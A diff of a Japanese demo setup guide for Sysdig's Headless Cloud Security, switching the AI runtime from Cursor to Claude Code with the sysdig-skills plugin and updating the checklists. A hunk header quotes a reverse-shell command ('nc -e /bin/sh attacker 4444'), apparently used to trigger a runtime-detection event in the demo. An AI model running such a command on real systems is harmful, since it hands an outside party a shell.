@@ -115,40 +115,56 @@ nc -e /bin/sh attacker 4444
 
 ここが Headless の主役。
 
-### 一番おすすめ
+### 公式サポート: Claude Code のみ
 
-#### Cursor
+Public Beta 時点で Sysdig が公式サポートしている AI ランタイムは **Claude Code** のみ。
+他の MCP 互換 Agent (Cursor / VSCode Agent 等) は理論上動くが launch 時点で非サポート。
 
-理由:
-- 見栄えが良い
-- 顧客受けが良い
-- AI感が強い
-- 日本企業でもわかりやすい
+### 必要なもの
 
-### 他候補
-
-| 製品 | 備考 |
-|------|------|
-| Claude Code | 強い |
-| VSCode Agent | 安定 |
-| OpenAI Codex系 | 技術者向け |
-| CLI Agent | 玄人向け |
+- Claude Code 本体
+- Anthropic アカウント
+- ターミナル (zsh/bash)
 
 ---
 
-## 7. MCP 接続
+## 7. Headless Cloud Security プラグイン
 
-これが Headless のコア。
+これが Headless のコア。Claude Code に Sysdig 公式の Skills プラグインを入れる。
 
 ### 必要
 
-- MCP Endpoint
-- API Token
-- Sysdig Skills
+- API Token (Sysdig UI → Settings → Sysdig API)
+- 環境変数:
+  - `SYSDIG_SECURE_URL` (例: `https://us2.app.sysdig.com`)
+  - `SYSDIG_SECURE_API_TOKEN`
+- Python 3 (stdlib のみ使用)
 
-### 実際には
+### 導入
 
-Headless Preview環境のセットアップが必要。
+```
+/plugin marketplace add sysdig/skills
+/plugin install headless-cloud-security@sysdig-skills
+```
+
+### 提供される Skill (5つ)
+
+| Skill | 用途 |
+|-------|------|
+| `sysdig-investigate` | Vulnerability 調査・優先順位付け |
+| `sysdig-runtime-investigate` | Falco runtime threat 分析 |
+| `sysdig-remediate` | 脆弱イメージ修正・PR/MR 作成 |
+| `sysdig-onboarding` | AWS / K8s onboarding |
+| `sysdig-posture` | Posture policy (Rego) 作成 |
+
+### 前提条件
+
+Sysdig Sage が **テナント側で有効化されていること** (Public Beta の制約)。
+
+### 参考
+
+- https://github.com/sysdig/skills
+- https://www.sysdig.com/blog/introducing-headless-cloud-security
 
 ---
 
@@ -204,9 +220,9 @@ Headless Preview環境のセットアップが必要。
 | 項目 | 内容 |
 |------|------|
 | Internet | 必須 |
-| Cursor login | 必須 |
+| Anthropic / Claude Code | 必須 |
 | Sysdig SaaS | 必須 |
-| MCP endpoint | 必須 |
+| GitHub (sysdig/skills 取得) | 必須 |
 
 ---
 
@@ -217,7 +233,7 @@ Headless Preview環境のセットアップが必要。
 Mac。
 
 理由:
-- Cursor安定
+- Claude Code 安定
 - Terminal映え
 - Kubernetesやりやすい
 
@@ -229,10 +245,10 @@ Mac。
 
 | 要素 | 推奨 |
 |------|------|
-| Cloud | AWS |
-| K8s | EKS |
+| Cloud | GCP (or AWS) |
+| K8s | GKE Standard (or EKS) |
 | Runtime | Sysdig Agent |
-| AI | Cursor |
+| AI | Claude Code + sysdig-skills プラグイン |
 | Demo | 事前仕込み |
 | UI | 最小限 |
 | Namespace | fixed |
@@ -263,12 +279,12 @@ GitHub Actions。すると「PR remediation」まで見せられる。
 
 | 必要 | 内容 |
 |------|------|
-| Sysdig Secure | 1 |
+| Sysdig Secure (Sage 有効) | 1 |
 | Kubernetes | 1 |
 | Agent | 1 |
 | Vulnerable container | 1 |
 | Runtime Event | 1 |
-| Cursor | 1 |
+| Claude Code | 1 |
 | API Token | 1 |
 
 これだけでデモは成立します。
@@ -279,12 +295,13 @@ GitHub Actions。すると「PR remediation」まで見せられる。
 
 | Step | 内容 |
 |------|------|
-| Step 1 | Sysdig Secure テナント確認 |
+| Step 1 | Sysdig Secure テナント確認 (リージョン + Sage 有効化) |
 | Step 2 | Kubernetes接続 |
 | Step 3 | Runtime Event発生確認 |
 | Step 4 | 脆弱性表示確認 |
-| Step 5 | Cursor + MCP接続 |
-| Step 6 | AI Query 動作確認 |
+| Step 5 | API Token 発行 |
+| Step 6 | Claude Code + sysdig-skills プラグイン導入 |
+| Step 7 | AI Query 動作確認 |
 
 ---
 
